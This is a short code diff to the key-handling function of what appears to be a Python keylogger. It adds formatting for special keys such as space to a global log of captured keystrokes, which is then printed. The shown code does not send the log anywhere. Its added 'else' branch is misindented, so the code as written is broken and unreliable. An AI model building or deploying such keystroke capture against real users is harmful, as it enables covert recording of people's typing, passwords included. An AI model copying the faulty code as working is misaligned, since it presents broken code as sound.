@@ -11,8 +11,11 @@ def process_keypress(key):
     global log #to define global variables
     try:
         log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
-    except AttributeError:
-        log = log + str(key)
+    except AttributeError: #AttributeError triggered if special char is used (Space, etc)
+        if key == key.space:
+            log = log + " "
+         else:
+            log = log + " " + str(key) + " " #add space in between
     #print(key)
     print(log)
     
